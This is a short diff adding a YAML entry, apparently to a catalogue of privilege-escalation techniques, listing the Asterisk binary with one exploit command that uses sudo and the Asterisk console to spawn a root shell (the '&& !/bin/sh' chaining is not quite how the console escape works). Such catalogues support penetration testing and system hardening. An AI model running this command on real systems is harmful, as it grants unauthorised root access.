@@ -1,0 +1,4 @@
+name: asterisk
+binary_path: /usr/bin/asterisk
+exploit_cmds:
+- sudo /usr/bin/asterisk -r && !/bin/sh
